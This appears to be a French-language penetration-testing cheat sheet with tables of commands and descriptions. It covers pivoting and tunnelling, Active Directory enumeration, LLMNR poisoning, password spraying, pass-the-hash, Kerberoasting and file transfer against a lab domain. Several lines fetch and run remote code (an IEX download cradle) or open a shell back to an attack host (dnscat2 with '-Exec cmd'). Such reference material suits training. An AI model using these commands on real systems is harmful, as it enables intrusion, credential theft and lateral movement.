| `1..254 \| % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}` | One-liner PowerShell utilisé pour ping les adresses 1 - 254 dans le segment réseau spécifié. |
| `msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23` | Commande Metasploit qui exécute un module de ping sweep contre le segment réseau spécifié (`RHOSTS=172.16.5.0/23`). |

## Port Forwarding avec Meterpreter

| Commande | Description |
|----------|-------------|
| `meterpreter > help portfwd` | Commande Meterpreter utilisée pour afficher les fonctionnalités de la commande portfwd. |
| `meterpreter > portfwd add -l 3300 -p 3389 -r <AdresseIPduCible>` | Commande portfwd basée sur Meterpreter qui ajoute une règle de transfert à la session Meterpreter actuelle. Cette règle transfère le trafic réseau sur le port 3300 de la machine locale vers le port 3389 (RDP) sur la cible. |
| `xfreerdp /v:localhost:3300 /u:victor /p:pass@123` | Utilise xfreerdp pour se connecter à un hôte distant via localhost:3300 en utilisant un ensemble d'identifiants. Des règles de redirection de port doivent être en place pour que cela fonctionne correctement. |
| `meterpreter > portfwd add -R -l 8081 -p 1234 -L <AdresseIPdHôteAttaque>` | Commande portfwd basée sur Meterpreter qui ajoute une règle de transfert qui dirige le trafic entrant sur le port 8081 vers le port `1234` écoutant sur l'adresse IP de l'hôte d'attaque. |
| `meterpreter > bg` | Commande basée sur Meterpreter utilisée pour exécuter la session metepreter sélectionnée en arrière-plan. Similaire à la mise en arrière-plan d'un processus sous Linux. |

## Outils Spécialisés

| Commande | Description |
|----------|-------------|
| `msf6 > use auxiliary/server/socks_proxy` | Commande Metasploit qui sélectionne le module auxiliaire `socks_proxy`. |
| `msf6 auxiliary(server/socks_proxy) > jobs` | Commande Metasploit qui liste tous les jobs en cours d'exécution. |
| `msf6 > use post/multi/manage/autoroute` | Commande Metasploit utilisée pour sélectionner le module autoroute. |
| `socat TCP4-LISTEN:8080,fork TCP4:<AdresseIPdHôteAttaque>:80` | Utilise Socat pour écouter sur le port 8080 puis faire un fork lorsque la connexion est reçue. Il se connectera ensuite à l'hôte d'attaque sur le port 80. |
| `socat TCP4-LISTEN:8080,fork TCP4:<AdresseIPduCible>:8443` | Utilise Socat pour écouter sur le port 8080 puis faire un fork lorsque la connexion est reçue. Ensuite, il se connectera à l'hôte cible sur le port 8443. |
| `plink -D 9050 ubuntu@<AdresseIPduCible>` | Commande Windows qui utilise Plink.exe de PuTTY pour effectuer une redirection de port SSH dynamique et établit un tunnel SSH avec la cible spécifiée. Cela permettra le chaînage de proxy sur un hôte Windows, similaire à ce qui est fait avec Proxychains sur un hôte Linux. |
| `sudo apt-get install sshuttle` | Utilise apt-get pour installer l'outil sshuttle. |
| `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v` | Exécute sshuttle, se connecte à l'hôte cible et crée une route vers le réseau 172.16.5.0 pour que le trafic puisse passer de l'hôte d'attaque aux hôtes sur le réseau interne (`172.16.5.0`). |
| `sudo git clone https://github.com/klsecservices/rpivot.git` | Clone le dépôt GitHub du projet rpivot. |
| `sudo apt-get install python2.7` | Utilise apt-get pour installer python2.7. |
| `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0` | Utilisé pour exécuter le serveur rpivot (`server.py`) sur le port proxy `9050`, le port serveur `9999` et écoutant sur n'importe quelle adresse IP (`0.0.0.0`). |
| `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999` | Utilisé pour exécuter le client rpivot (`client.py`) pour se connecter au serveur rpivot spécifié sur le port approprié. |
| `./chisel server -v -p 1234 --socks5` | Utilisé pour démarrer un serveur chisel en mode verbose écoutant sur le port `1234` en utilisant SOCKS version 5. |
| `./chisel client -v 10.129.202.64:1234 socks` | Utilisé pour se connecter à un serveur chisel à l'adresse IP et au port spécifiés en utilisant des socks. |

## Tunneling DNS et ICMP

| Commande | Description |
|----------|-------------|
| `git clone https://github.com/iagox86/dnscat2.git` | Clone le dépôt GitHub du projet `dnscat2`. |
| `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache` | Utilisé pour démarrer le serveur dnscat2.rb s'exécutant sur l'adresse IP spécifiée, le port (`53`) et utilisant le domaine `inlanefreight.local` avec l'option no-cache activée. |
| `git clone https://github.com/lukebaggett/dnscat2-powershell.git` | Clone le dépôt Github du projet dnscat2-powershell. |
| `Import-Module dnscat2.ps1` | Commande PowerShell utilisée pour importer l'outil dnscat2.ps1. |
| `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd` | Commande PowerShell utilisée pour se connecter à un serveur dnscat2 spécifié en utilisant une adresse IP, un nom de domaine et un secret prépartagé. Le client renverra une connexion shell au serveur (`-Exec cmd`). |
| `dnscat2> ?` | Utilisé pour lister les options dnscat2. |
| `dnscat2> window -i 1` | Utilisé pour interagir avec une session dnscat2 établie. |
| `git clone https://github.com/utoni/ptunnel-ng.git` | Clone le dépôt GitHub du projet ptunnel-ng. |
| `sudo ./autogen.sh` | Utilisé pour exécuter le script shell autogen.sh qui construira les fichiers ptunnel-ng nécessaires. |
| `sudo ./ptunnel-ng -r10.129.202.64 -R22` | Utilisé pour démarrer le serveur ptunnel-ng sur l'adresse IP spécifiée (`-r`) et le port correspondant (`-R22`). |
| `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22` | Utilisé pour se connecter à un serveur ptunnel-ng spécifié via le port local 2222 (`-l2222`). |
| `ssh -p2222 -lubuntu 127.0.0.1` | Commande SSH utilisée pour se connecter à un serveur SSH via un port local. Cela peut être utilisé pour tunneler le trafic SSH à travers un tunnel ICMP. |

## Solutions Windows

| Commande | Description |
|----------|-------------|
| `msf6 > search rdp_scanner` | Recherche Metasploit qui tente de trouver un module appelé `rdp_scanner`. |
| `regsvr32.exe SocksOverRDP-Plugin.dll` | Commande Windows utilisée pour enregistrer le SocksOverRDP-PLugin.dll. |
| `netstat -antb \|findstr 1080` | Commande Windows utilisée pour lister les connexions réseau TCP écoutant sur le port 1080. |
| `python client.py --server-ip <AdresseIPduServeurWebCible> --server-port 8080 --ntlm-proxy-ip AdresseIPduProxy> --ntlm-proxy-port 8081 --domain <nomduDomaineWindows> --username <nomutilisateur> --password <motdepasse>` | Utilisé pour exécuter le client rpivot pour se connecter à un serveur web qui utilise HTTP-Proxy avec authentification NTLM. |
| `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25` | Commande Windows qui utilise `netsh.exe` pour configurer une règle portproxy appelée `v4tov4` qui écoute sur le port 8080 et transfère les connexions vers la destination 172.16.5.25 sur le port 3389. |
| `netsh.exe interface portproxy show v4tov4` | Commande Windows utilisée pour afficher les configurations d'une règle portproxy appelée v4tov4. |



# Active Directory

## Table des matières
1. [Énumération Initiale](#énumération-initiale)
2. [Empoisonnement LLMNR/NTB-NS](#empoisonnement-llmnrntb-ns)
3. [Pulvérisation de Mots de Passe et Politiques de Mots de Passe](#pulvérisation-de-mots-de-passe-et-politiques-de-mots-de-passe)

## Énumération Initiale

| Commande | Description |
|----------|-------------|
| `nslookup ns1.inlanefreight.com` | Utilisée pour interroger le système de noms de domaine et découvrir la correspondance entre l'adresse IP et le nom de domaine de la cible entrée depuis un hôte basé sur Linux. |
| `sudo tcpdump -i ens224` | Utilisée pour commencer à capturer des paquets réseau sur l'interface réseau suivant l'option `-i` sur un hôte basé sur Linux. |
| `sudo responder -I ens224 -A` | Utilisée pour commencer à répondre et à analyser les requêtes `LLMNR`, `NBT-NS` et `MDNS` sur l'interface spécifiée après l'option `-I` et fonctionnant en mode `Analyse Passive`, activé avec `-A`. Exécutée depuis un hôte basé sur Linux. |
| `fping -asgq 172.16.5.0/23` | Effectue un balayage ping sur le segment de réseau spécifié depuis un hôte basé sur Linux. |
| `sudo nmap -v -A -iL hosts.txt -oN /home/User/Documents/host-enum` | Effectue un scan nmap avec détection du système d'exploitation, détection de version, analyse de scripts et traceroute activés (`-A`) basé sur une liste d'hôtes (`hosts.txt`) spécifiée dans le fichier suivant `-iL`. Puis enregistre les résultats du scan dans le fichier spécifié après l'option `-oN`. Exécuté depuis un hôte basé sur Linux. |
| `sudo git clone https://github.com/ropnop/kerbrute.git` | Utilise `git` pour cloner l'outil kerbrute depuis un hôte basé sur Linux. |
| `make help` | Utilisée pour lister les options de compilation possibles avec `make` depuis un hôte basé sur Linux. |
| `sudo make all` | Utilisée pour compiler un binaire `Kerbrute` pour plusieurs plateformes OS et architectures CPU. |
| `./kerbrute_linux_amd64` | Utilisée pour tester le binaire `Kebrute` compilé choisi depuis un hôte basé sur Linux. |
| `sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute` | Utilisée pour déplacer le binaire `Kerbrute` dans un répertoire qui peut être défini dans le chemin d'un utilisateur Linux. Facilitant l'utilisation de l'outil. |
| `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Exécute l'outil Kerbrute pour découvrir les noms d'utilisateurs dans le domaine (`INLANEFREIGHT.LOCAL`) spécifié après l'option `-d` et le contrôleur de domaine associé spécifié après `--dc` en utilisant une liste de mots et enregistre (`-o`) les résultats dans un fichier spécifié. Exécuté depuis un hôte basé sur Linux. |

## Empoisonnement LLMNR/NTB-NS

| Commande | Description |
|----------|-------------|
| `responder -h` | Utilisée pour afficher les instructions d'utilisation et les diverses options disponibles dans `Responder` depuis un hôte basé sur Linux. |
| `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` | Utilise `hashcat` pour cracker les hash `NTLMv2` (`-m`) qui ont été capturés par responder et sauvegardés dans un fichier (`frond_ntlmv2`). Le craquage est effectué sur la base d'une liste de mots spécifiée. |
| `Import-Module .\Inveigh.ps1` | Utilise le cmdlet `Import-Module` de PowerShell pour importer l'outil basé sur Windows `Inveigh.ps1`. |
| `(Get-Command Invoke-Inveigh).Parameters` | Utilisée pour afficher de nombreuses options et fonctionnalités disponibles avec `Invoke-Inveigh`. Exécutée depuis un hôte basé sur Windows. |
| `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y` | Démarre `Inveigh` sur un hôte basé sur Windows avec l'usurpation LLMNR et NBNS activée et enregistre les résultats dans un fichier. |
| `.\Inveigh.exe` | Démarre l'implémentation `C#` d'`Inveigh` depuis un hôte basé sur Windows. |
| `$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}` | Script PowerShell utilisé pour désactiver NBT-NS sur un hôte Windows. |

## Pulvérisation de Mots de Passe et Politiques de Mots de Passe

| Commande | Description |
|----------|-------------|
| `#!/bin/bash for x in {A..Z}{A..Z}{A..Z}{A..Z} do echo $x; done` | Script Bash utilisé pour générer `16,079,616` combinaisons de noms d'utilisateurs possibles depuis un hôte basé sur Linux. |
| `crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol` | Utilise `CrackMapExec` et des identifiants valides (`avazquez:Password123`) pour énumérer la politique de mot de passe (`--pass-pol`) depuis un hôte basé sur Linux. |
| `rpcclient -U "" -N 172.16.5.5` | Utilise `rpcclient` pour découvrir des informations sur le domaine via des sessions `SMB NULL`. Exécutée depuis un hôte basé sur Linux. |
| `rpcclient $> querydominfo` | Utilise `rpcclient` pour énumérer la politique de mot de passe dans un domaine Windows cible depuis un hôte basé sur Linux. |
| `enum4linux -P 172.16.5.5` | Utilise `enum4linux` pour énumérer la politique de mot de passe (`-P`) dans un domaine Windows cible depuis un hôte basé sur Linux. |
| `enum4linux-ng -P 172.16.5.5 -oA ilfreight` | Utilise `enum4linux-ng` pour énumérer la politique de mot de passe (`-P`) dans un domaine Windows cible depuis un hôte basé sur Linux, puis présente la sortie en YAML et JSON sauvegardée dans un fichier après l'option `-oA`. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" \| grep -m 1 -B 10 pwdHistoryLength` | Utilise `ldapsearch` pour énumérer la politique de mot de passe dans un domaine Windows cible depuis un hôte basé sur Linux. |
| `net accounts` | Utilisée pour énumérer la politique de mot de passe dans un domaine Windows depuis un hôte basé sur Windows. |
| `Import-Module .\PowerView.ps1` | Utilise le cmdlet Import-Module pour importer l'outil `PowerView.ps1` depuis un hôte basé sur Windows. |
| `Get-DomainPolicy` | Utilisée pour énumérer la politique de mot de passe dans un domaine Windows cible depuis un hôte basé sur Windows. |
| `enum4linux -U 172.16.5.5 \| grep "user:" \| cut -f2 -d"[" \| cut -f1 -d"]"` | Utilise `enum4linux` pour découvrir les comptes utilisateurs dans un domaine Windows cible, puis utilise `grep` pour filtrer la sortie afin d'afficher uniquement l'utilisateur depuis un hôte basé sur Linux. |
| `rpcclient -U "" -N 172.16.5.5 rpcclient $> enumdomuser` | Utilise rpcclient pour découvrir les comptes utilisateurs dans un domaine Windows cible depuis un hôte basé sur Linux. |
| `crackmapexec smb 172.16.5.5 --users` | Utilise `CrackMapExec` pour découvrir les utilisateurs (`--users`) dans un domaine Windows cible depuis un hôte basé sur Linux. |
| `ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" \| grep sAMAccountName: \| cut -f2 -d" "` | Utilise `ldapsearch` pour découvrir les utilisateurs dans un domaine Windows cible, puis filtre la sortie en utilisant `grep` pour n'afficher que le `sAMAccountName` depuis un hôte basé sur Linux. |
| `./windapsearch.py --dc-ip 172.16.5.5 -u "" -U` | Utilise l'outil Python `windapsearch.py` pour découvrir les utilisateurs dans un domaine Windows cible depuis un hôte basé sur Linux. |
| `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 \| grep Authority; done` | One-liner Bash utilisé pour effectuer une attaque de pulvérisation de mot de passe en utilisant `rpcclient` et une liste d'utilisateurs (`valid_users.txt`) depuis un hôte basé sur Linux. Il filtre également les tentatives échouées pour rendre la sortie plus propre. |
| `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1` | Utilise `kerbrute` et une liste d'utilisateurs (`valid_users.txt`) pour effectuer une attaque de pulvérisation de mot de passe contre un domaine Windows cible depuis un hôte basé sur Linux. |
| `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 \| grep +` | Utilise `CrackMapExec` et une liste d'utilisateurs (`valid_users.txt`) pour effectuer une attaque de pulvérisation de mot de passe contre un domaine Windows cible depuis un hôte basé sur Linux. Il filtre également les échecs de connexion en utilisant `grep`. |
| `sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123` | Utilise `CrackMapExec` pour valider un ensemble d'identifiants depuis un hôte basé sur Linux. |
| `sudo crackmapexec smb --local-auth 172.16.5.0/24 -u administrator -H 88ad09182de639ccc6579eb0849751cf \| grep +` | Utilise `CrackMapExec` et le flag `-local-auth` pour s'assurer qu'une seule tentative de connexion est effectuée depuis un hôte basé sur Linux. Ceci pour garantir que les comptes ne sont pas verrouillés par les politiques de mot de passe appliquées. Il filtre également les échecs de connexion en utilisant `grep`. |
| `Import-Module .\DomainPasswordSpray.ps1` | Utilisé pour importer l'outil basé sur PowerShell `DomainPasswordSpray.ps1` depuis un hôte basé sur Windows. |
| `Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue` | Effectue une attaque de pulvérisation de mot de passe et enregistre (-OutFile) les résultats dans un fichier spécifié (`spray_success`) depuis un hôte basé sur Windows. |


# Énumération de Contrôles de Sécurité et Active Directory

## Table des matières
1. [Énumération des Contrôles de Sécurité](#énumération-des-contrôles-de-sécurité)
2. [Énumération avec Identifiants](#énumération-avec-identifiants)
3. [Énumération par "Living Off the Land"](#énumération-par-living-off-the-land)

## Énumération des Contrôles de Sécurité

| Commande | Description |
|----------|-------------|
| `Get-MpComputerStatus` | Cmdlet PowerShell utilisé pour vérifier le statut de `Windows Defender Anti-Virus` depuis un hôte basé sur Windows. |
| `Get-AppLockerPolicy -Effective \| select -ExpandProperty RuleCollections` | Cmdlet PowerShell utilisé pour visualiser les politiques `AppLocker` depuis un hôte basé sur Windows. |
| `$ExecutionContext.SessionState.LanguageMode` | Script PowerShell utilisé pour découvrir le `Mode de Langage PowerShell` utilisé sur un hôte basé sur Windows. Exécuté depuis un hôte basé sur Windows. |
| `Find-LAPSDelegatedGroups` | Une fonction `LAPSToolkit` qui découvre les `Groupes Délégués LAPS` depuis un hôte basé sur Windows. |
| `Find-AdmPwdExtendedRights` | Une fonction `LAPSTookit` qui vérifie les droits sur chaque ordinateur avec LAPS activé pour tous les groupes ayant un accès en lecture et les utilisateurs avec `Tous les Droits Étendus`. Exécutée depuis un hôte basé sur Windows. |
| `Get-LAPSComputers` | Une fonction `LAPSToolkit` qui recherche les ordinateurs qui ont LAPS activé, découvre l'expiration des mots de passe et peut découvrir les mots de passe aléatoires. Exécutée depuis un hôte basé sur Windows. |

## Énumération avec Identifiants

| Commande | Description |
|----------|-------------|
| `xfreerdp /u:forend@inlanefreight.local /p:Klmcargo2 /v:172.16.5.25` | Se connecte à une cible Windows en utilisant des identifiants valides. Exécutée depuis un hôte basé sur Linux. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users` | S'authentifie auprès d'une cible Windows via `smb` en utilisant des identifiants valides et tente de découvrir plus d'utilisateurs (`--users`) dans un domaine Windows cible. Exécutée depuis un hôte basé sur Linux. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups` | S'authentifie auprès d'une cible Windows via `smb` en utilisant des identifiants valides et tente de découvrir des groupes (`--groups`) dans un domaine Windows cible. Exécutée depuis un hôte basé sur Linux. |
| `sudo crackmapexec smb 172.16.5.125 -u forend -p Klmcargo2 --loggedon-users` | S'authentifie auprès d'une cible Windows via `smb` en utilisant des identifiants valides et tente de vérifier une liste d'utilisateurs connectés (`--loggedon-users`) sur l'hôte Windows cible. Exécutée depuis un hôte basé sur Linux. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --shares` | S'authentifie auprès d'une cible Windows via `smb` en utilisant des identifiants valides et tente de découvrir tous les partages smb (`--shares`). Exécutée depuis un hôte basé sur Linux. |
| `sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share Dev-share` | S'authentifie auprès d'une cible Windows via `smb` en utilisant des identifiants valides et utilise le module CrackMapExec (`-M`) `spider_plus` pour parcourir chaque partage lisible (`Dev-share`) et lister tous les fichiers lisibles. Les résultats sont affichés en `JSON`. Exécutée depuis un hôte basé sur Linux. |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5` | Énumère le domaine Windows cible en utilisant des identifiants valides et liste les partages et les permissions disponibles sur chacun dans le contexte des identifiants valides utilisés et de l'hôte Windows cible (`-H`). Exécutée depuis un hôte basé sur Linux. |
| `smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R SYSVOL --dir-only` | Énumère le domaine Windows cible en utilisant des identifiants valides et effectue une liste récursive (`-R`) du partage spécifié (`SYSVOL`) et n'affiche qu'une liste de répertoires (`--dir-only`) dans le partage. Exécutée depuis un hôte basé sur Linux. |
| `rpcclient $> queryuser 0x457` | Énumère un compte utilisateur cible dans un domaine Windows en utilisant son identifiant relatif (`0x457`). Exécutée depuis un hôte basé sur Linux. |
| `rpcclient $> enumdomusers` | Découvre les comptes utilisateurs dans un domaine Windows cible et leurs identifiants relatifs associés (`rid`). Exécutée depuis un hôte basé sur Linux. |
| `psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125` | Outil Impacket utilisé pour se connecter à la `CLI` d'une cible Windows via le partage administratif `ADMIN$` avec des identifiants valides. Exécuté depuis un hôte basé sur Linux. |
| `wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5` | Outil Impacket utilisé pour se connecter à la `CLI` d'une cible Windows via `WMI` avec des identifiants valides. Exécuté depuis un hôte basé sur Linux. |
| `windapsearch.py -h` | Utilisé pour afficher les options et la fonctionnalité de windapsearch.py. Exécuté depuis un hôte basé sur Linux. |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 --da` | Utilisé pour énumérer le groupe des administrateurs de domaine (`--da`) en utilisant un ensemble d'identifiants valides sur un domaine Windows cible. Exécuté depuis un hôte basé sur Linux. |
| `python3 windapsearch.py --dc-ip 172.16.5.5 -u inlanefreight\wley -p transporter@4 -PU` | Utilisé pour effectuer une recherche récursive (`-PU`) d'utilisateurs avec des permissions imbriquées en utilisant des identifiants valides. Exécuté depuis un hôte basé sur Linux. |
| `sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all` | Exécute l'implémentation python de BloodHound (`bloodhound.py`) avec des identifiants valides et spécifie un serveur de noms (`-ns`) et un domaine Windows cible (`inlanefreight.local`) ainsi qu'exécute toutes les vérifications (`-c all`). Fonctionne avec des identifiants valides. Exécuté depuis un hôte basé sur Linux. |

## Énumération par "Living Off the Land"

| Commande | Description |
|----------|-------------|
| `Get-Module` | Cmdlet PowerShell utilisé pour lister tous les modules disponibles, leur version et options de commande depuis un hôte basé sur Windows. |
| `Import-Module ActiveDirectory` | Charge le module PowerShell `Active Directory` depuis un hôte basé sur Windows. |
| `Get-ADDomain` | Cmdlet PowerShell utilisé pour recueillir des informations sur le domaine Windows depuis un hôte basé sur Windows. |
| `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` | Cmdlet PowerShell utilisé pour énumérer les comptes utilisateurs sur un domaine Windows cible et filtrer par `ServicePrincipalName`. Exécuté depuis un hôte basé sur Windows. |
| `Get-ADTrust -Filter *` | Cmdlet PowerShell utilisé pour énumérer toutes les relations de confiance dans un domaine Windows cible et filtre par tous (`-Filter *`). Exécuté depuis un hôte basé sur Windows. |
| `Get-ADGroup -Filter * \| select name` | Cmdlet PowerShell utilisé pour énumérer les groupes dans un domaine Windows cible et filtre par le nom du groupe (`select name`). Exécuté depuis un hôte basé sur Windows. |
| `Get-ADGroup -Identity "Backup Operators"` | Cmdlet PowerShell utilisé pour rechercher un groupe spécifique (`-Identity "Backup Operators"`). Exécuté depuis un hôte basé sur Windows. |
| `Get-ADGroupMember -Identity "Backup Operators"` | Cmdlet PowerShell utilisé pour découvrir les membres d'un groupe spécifique (`-Identity "Backup Operators"`). Exécuté depuis un hôte basé sur Windows. |
| `Export-PowerViewCSV` | Script PowerView utilisé pour ajouter des résultats à un fichier `CSV`. Exécuté depuis un hôte basé sur Windows. |
| `ConvertTo-SID` | Script PowerView utilisé pour convertir un nom d'`Utilisateur` ou de `Groupe` en son `SID`. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainSPNTicket` | Script PowerView utilisé pour demander le ticket kerberos pour un nom principal de service spécifié (`SPN`). Exécuté depuis un hôte basé sur Windows. |
| `Get-Domain` | Script PowerView utilisé pour retourner l'objet AD pour le domaine actuel (ou spécifié). Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainController` | Script PowerView utilisé pour retourner une liste des contrôleurs de domaine cibles pour le domaine cible spécifié. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainUser` | Script PowerView utilisé pour retourner tous les utilisateurs ou des objets utilisateurs spécifiques dans AD. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainComputer` | Script PowerView utilisé pour retourner tous les ordinateurs ou des objets ordinateurs spécifiques dans AD. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainGroup` | Script PowerView utilisé pour retourner tous les groupes ou des objets groupes spécifiques dans AD. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainOU` | Script PowerView utilisé pour rechercher tous les objets OU ou des objets OU spécifiques dans AD. Exécuté depuis un hôte basé sur Windows. |
| `Find-InterestingDomainAcl` | Script PowerView utilisé pour trouver des `ACL` d'objets dans le domaine avec des droits de modification définis pour des objets non intégrés. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainGroupMember` | Script PowerView utilisé pour retourner les membres d'un groupe de domaine spécifique. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainFileServer` | Script PowerView utilisé pour retourner une liste de serveurs fonctionnant probablement comme des serveurs de fichiers. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainDFSShare` | Script PowerView utilisé pour retourner une liste de tous les systèmes de fichiers distribués pour le domaine actuel (ou spécifié). Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainGPO` | Script PowerView utilisé pour retourner tous les GPO ou des objets GPO spécifiques dans AD. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainPolicy` | Script PowerView utilisé pour retourner la politique de domaine par défaut ou la politique de contrôleur de domaine pour le domaine actuel. Exécuté depuis un hôte basé sur Windows. |
| `Get-NetLocalGroup` | Script PowerView utilisé pour énumérer les groupes locaux sur une machine locale ou distante. Exécuté depuis un hôte basé sur Windows. |
| `Get-NetLocalGroupMember` | Script PowerView utilisé pour énumérer les membres d'un groupe local spécifique. Exécuté depuis un hôte basé sur Windows. |
| `Get-NetShare` | Script PowerView utilisé pour retourner une liste de partages ouverts sur une machine locale (ou distante). Exécuté depuis un hôte basé sur Windows. |
| `Get-NetSession` | Script PowerView utilisé pour retourner les informations de session pour la machine locale (ou distante). Exécuté depuis un hôte basé sur Windows. |
| `Test-AdminAccess` | Script PowerView utilisé pour tester si l'utilisateur actuel a un accès administratif à la machine locale (ou distante). Exécuté depuis un hôte basé sur Windows. |
| `Find-DomainUserLocation` | Script PowerView utilisé pour trouver les machines où des utilisateurs spécifiques sont connectés. Exécuté depuis un hôte basé sur Windows. |
| `Find-DomainShare` | Script PowerView utilisé pour trouver des partages accessibles sur les machines du domaine. Exécuté depuis un hôte basé sur Windows. |
| `Find-InterestingDomainShareFile` | Script PowerView qui recherche des fichiers correspondant à des critères spécifiques sur des partages lisibles dans le domaine. Exécuté depuis un hôte basé sur Windows. |
| `Find-LocalAdminAccess` | Script PowerView utilisé pour trouver des machines sur le domaine local où l'utilisateur actuel a un accès administrateur local. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainTrust` | Script PowerView qui retourne les relations de confiance du domaine pour le domaine actuel ou un domaine spécifié. Exécuté depuis un hôte basé sur Windows. |
| `Get-ForestTrust` | Script PowerView qui retourne toutes les relations de confiance de forêt pour la forêt actuelle ou une forêt spécifiée. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainForeignUser` | Script PowerView qui énumère les utilisateurs qui sont dans des groupes en dehors du domaine de l'utilisateur. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainForeignGroupMember` | Script PowerView qui énumère les groupes avec des utilisateurs en dehors du domaine du groupe et retourne chaque membre étranger. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainTrustMapping` | Script PowerView qui énumère toutes les relations de confiance pour le domaine actuel et tout autre domaine visible. Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainGroupMember -Identity "Domain Admins" -Recurse` | Script PowerView utilisé pour lister tous les membres d'un groupe cible (`"Domain Admins"`) grâce à l'utilisation de l'option récursive (`-Recurse`). Exécuté depuis un hôte basé sur Windows. |
| `Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName` | Script PowerView utilisé pour trouver des utilisateurs sur le domaine Windows cible qui ont le `Service Principal Name` défini. Exécuté depuis un hôte basé sur Windows. |
| `.\Snaffler.exe -d INLANEFREIGHT.LOCAL -s -v data` | Exécute un outil appelé `Snaffler` contre un domaine Windows cible qui trouve différents types de données dans les partages auxquels le compte compromis a accès. Exécuté depuis un hôte basé sur Windows. |


# Transfert de Fichiers, Kerberoasting et Énumération ACL

## Table des matières
1. [Transfert de Fichiers](#transfert-de-fichiers)
2. [Kerberoasting](#kerberoasting)
3. [Énumération et Tactiques ACL](#énumération-et-tactiques-acl)

## Transfert de Fichiers

| Commande | Description |
|----------|-------------|
| `sudo python3 -m http.server 8001` | Démarre un serveur web Python pour l'hébergement rapide de fichiers. Exécuté depuis un hôte basé sur Linux. |
| `"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"` | One-liner PowerShell utilisé pour télécharger un fichier depuis un serveur web. Exécuté depuis un hôte basé sur Windows. |
| `impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/` | Démarre un serveur `SMB` impacket pour l'hébergement rapide d'un fichier. Exécuté depuis un hôte basé sur Windows. |

## Kerberoasting

| Commande | Description |
|----------|-------------|
| `sudo python3 -m pip install .` | Utilisé pour installer Impacket à partir du répertoire qui a été cloné sur l'hôte d'attaque. Exécuté depuis un hôte basé sur Linux. |
| `GetUserSPNs.py -h` | Outil Impacket utilisé pour afficher les options et la fonctionnalité de `GetUserSPNs.py` depuis un hôte basé sur Linux. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday` | Outil Impacket utilisé pour obtenir une liste de `SPN` sur le domaine Windows cible depuis un hôte basé sur Linux. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request` | Outil Impacket utilisé pour télécharger/demander (`-request`) tous les tickets TGS pour un traitement hors ligne depuis un hôte basé sur Linux. |
| `GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/mholliday -request-user sqldev` | Outil Impacket utilisé pour télécharger/demander (`-request-user`) un ticket TGS pour un compte utilisateur spécifique (`sqldev`) depuis un hôte basé sur Linux. |
